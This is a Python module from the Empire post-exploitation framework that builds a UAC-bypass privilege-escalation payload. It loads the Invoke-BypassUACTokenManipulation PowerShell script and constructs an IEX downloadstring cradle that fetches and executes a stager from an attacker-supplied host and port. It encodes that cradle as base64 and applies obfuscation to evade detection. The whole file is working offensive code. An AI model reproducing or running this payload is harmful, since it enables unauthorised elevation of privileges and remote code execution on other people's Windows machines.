from __future__ import print_function

import base64
import re
from builtins import object
from builtins import str
from typing import Dict

from empire.server.common import helpers
from empire.server.common.module_models import PydanticModule
from empire.server.utils import data_util
from empire.server.utils.module_util import handle_error_message


class Module(object):
    @staticmethod
    def generate(main_menu, module: PydanticModule, params: Dict, obfuscate: bool = False, obfuscation_command: str = ""):
        stager = params['Stager']
        host = params['Host']
        userAgent = params['UserAgent']
        port = params['Port']

        module_source = main_menu.installPath + "/data/module_source/privesc/Invoke-BypassUACTokenManipulation.ps1"
        if obfuscate:
            data_util.obfuscate_module(moduleSource=module_source, obfuscationCommand=obfuscation_command)
            module_source = module_source.replace("module_source", "obfuscated_module_source")
        try:
            f = open(module_source, 'r')
        except:
            return handle_error_message("[!] Could not read module source path at: " + str(module_source))

        module_code = f.read()
        f.close()

        # If you'd just like to import a subset of the functions from the
        #   module source, use the following:
        #   script = helpers.generate_dynamic_powershell_script(moduleCode, ["Get-Something", "Set-Something"])
        script = module_code

        # Second method: For calling your imported source, or holding your
        #   inlined script. If you're importing source using the first method,
        #   ensure that you append to the script variable rather than set.
        #
        # The script should be stripped of comments, with a link to any
        #   original reference script included in the comments.
        #
        # If your script is more than a few lines, it's probably best to use
        #   the first method to source it.
        #
        # script += """

        try:
            blank_command = ""
            powershell_command = ""
            encoded_cradle = ""
            cradle = "IEX \"(new-object net.webclient).downloadstring('%s:%s/%s')\"|IEX" % (host, port, stager)
            # Remove weird chars that could have been added by ISE
            n = re.compile(u'(\xef|\xbb|\xbf)')
            # loop through each character and insert null byte
            for char in (n.sub("", cradle)):
                # insert the nullbyte
                blank_command += char + "\x00"
            # assign powershell command as the new one
            powershell_command = blank_command
            # base64 encode the powershell command

            encoded_cradle = base64.b64encode(powershell_command)

        except Exception as e:
            pass

        if obfuscate:
            scriptEnd = helpers.obfuscate(main_menu.installPath, psScript=script,
                                          obfuscationCommand=obfuscation_command)
        scriptEnd = "Invoke-BypassUACTokenManipulation -Arguments \"-w 1 -enc %s\"" % (encoded_cradle)
        script += scriptEnd
        script = data_util.keyword_obfuscation(script)

        return script
